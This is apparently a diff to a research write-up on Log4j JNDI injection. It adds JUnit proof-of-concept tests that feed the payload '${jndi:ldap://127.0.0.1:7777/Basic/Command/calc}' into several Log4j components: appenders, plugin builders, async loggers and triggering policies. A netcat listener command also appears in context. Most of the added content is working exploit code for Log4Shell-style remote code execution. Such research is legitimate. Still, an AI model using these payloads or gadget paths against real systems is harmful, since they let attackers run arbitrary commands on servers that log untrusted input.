@@ -187,6 +187,46 @@ nc -l -p 7777
     }
 ```
 
+**RollingFileAppender.createAppender()**
+
+```
+  @Test
+    public void createAppenderRollingFileAppenderTest() {
+        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);
+
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000", "true", CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
+                .withMax(String.valueOf(3))
+                .withConfig(new DefaultConfiguration())
+                .withFileIndex("min")
+                .build(), layout, fileInfoFilter, null, null, "", new DefaultConfiguration());
+    }
+```
+
+**RollingRandomAccessFileAppender.createAppender()**
+
+```
+ @Test
+    public void createAppenderRollingRandomAccessFileAppenderTest() {
+        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);
+
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingRandomAccessFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000",  CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
+                .withMax(String.valueOf(3))
+                .withConfig(new DefaultConfiguration())
+                .withFileIndex("min")
+                .build(), layout, fileInfoFilter, null, null, "",  new DefaultConfiguration());
+    }
+```
+
 **ANY_Manager.getManager()**
 
 Since the RollingFileManager utilizes a lookup call in access which invokes updateDate()->setTriggeringPolicy(), it is necessary to include setTriggeringPolicy within updateData(). This implementation is specific to RollingFileManager. Other managers that extend AbstractManager typically have an empty updateData method. Therefore, their getManager() calls do not execute setTriggeringPolicy and do not impact JNDI execution.
@@ -447,6 +487,23 @@ This field is utilized within the execute method of AbstractPathAction, which tr
     }
 ```
 
+**DefaultConfiguration.createConfiguration()**
+
+```
+ @Test
+    public void createConfigurationDefaultConfiguration() {
+        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
+        Configuration configuration = new DefaultConfiguration();
+        manager.collectPlugins();
+        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
+        Node nodeA = new Node(null, "root", plugin);
+        nodeA.setValue("root");
+        Node nodeB = new Node(nodeA, "child", plugin);
+        nodeB.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
+        configuration.createConfiguration(nodeB, new MutableLogEvent());
+    }
+```
+
 **JSONConfiguration.reconfigure()**
 
 ```
@@ -611,5 +668,156 @@ All methods are linked to parent nodes through DefaultConfig<Init>. Since this f
 
         rewriteAppender.stop();
         consoleAppender.stop();
+    }
+```
+
+## Pocs for Plugin Tree ##
+
+
+**PluginBuilder.build()**
+
+```
+ @Test
+    public void buildPluginBuilderTest(){
+        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
+        Node node = new Node();
+        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
+        manager.collectPlugins();
+        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
+        final PluginBuilder builder = new PluginBuilder(plugin).
+                withConfiguration(new DefaultConfiguration()).
+                withConfigurationNode(node);
+        builder.build();
+    }
+```
+
+## Pocs for Logger Tree ##
+
+**AsyncLogger.actualAsyncLog()**
+
+```
+ @Test
+    public void actualAsyncLogAsyncLoggerTest() throws IOException {
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        final LoggerContext ctx = new LoggerContext("TestContext");
+        final Configuration config = ctx.getConfiguration();
+
+        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
+        appender.start();
+        config.addAppender(appender);
+
+        Property[] properties = new Property[]{
+                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+        };
+
+
+        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
+        AppenderRef[] refs = new AppenderRef[]{ref};
+
+
+        LoggerConfig loggerConfig = LoggerConfig.createLogger(
+                "false", // additivity
+                Level.INFO, // level
+                "TestLogger", // loggerName
+                "true", // includeLocation
+                refs, // AppenderRef array
+                properties, // Property array
+                config, // current Configuration
+                null // Filter
+        );
+
+        loggerConfig.addAppender(appender, null, null);
+        config.addLogger("TestLogger", loggerConfig);
+
+        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);
+        logger.actualAsyncLog(new RingBufferLogEvent());
+    }
+```
+
+**RingBufferLogEvent.execute()**
+
+```
+ @Test
+    public void executeRingBufferLogEventTest() {
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        final LoggerContext ctx = new LoggerContext("TestContext");
+        final Configuration config = ctx.getConfiguration();
+
+        Appender appender = FileAppender.createAppender("target/test.log", "false", "false", "File", "true", "false", "false", "4000", layout, null, "false", null, config);
+        appender.start();
+        config.addAppender(appender);
+
+        Property[] properties = new Property[]{
+                Property.createProperty("keyA", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+        };
+
+
+        AppenderRef ref = AppenderRef.createAppenderRef("File", null, null);
+        AppenderRef[] refs = new AppenderRef[]{ref};
+
+
+        LoggerConfig loggerConfig = LoggerConfig.createLogger(
+                "false", // additivity
+                Level.INFO, // level
+                "TestLogger", // loggerName
+                "true", // includeLocation
+                refs, // AppenderRef array
+                properties, // Property array
+                config, // current Configuration
+                null // Filter
+        );
+
+        loggerConfig.addAppender(appender, null, null);
+        config.addLogger("TestLogger", loggerConfig);
+
+        AsyncLogger logger = new AsyncLogger(ctx, "TestLogger", null, null);
+
+        StringMap data = ContextDataFactory.createContextData();
+
+        RingBufferLogEvent bufferLogEvent = new RingBufferLogEvent();
+        bufferLogEvent.setValues(logger, null, null, null, null, new MutableLogEvent(), null, data, null, 1, null, 1, null,
+                new SystemMillisClock(), new SystemNanoClock());
+        bufferLogEvent.execute(true);
+    }
+```
+
+## Pocs for TriggeringPolicy Tree ##
+
+**CompositeTriggeringPolicy.initialize()**
+
+```
+  @Test
+    public void initializeCompositeTriggeringPolicy(){
+
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+
+        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
+        CompositeTriggeringPolicy compositePolicy = CompositeTriggeringPolicy.createPolicy(policy);
+        compositePolicy.initialize(appender.getManager());
     }
 ```
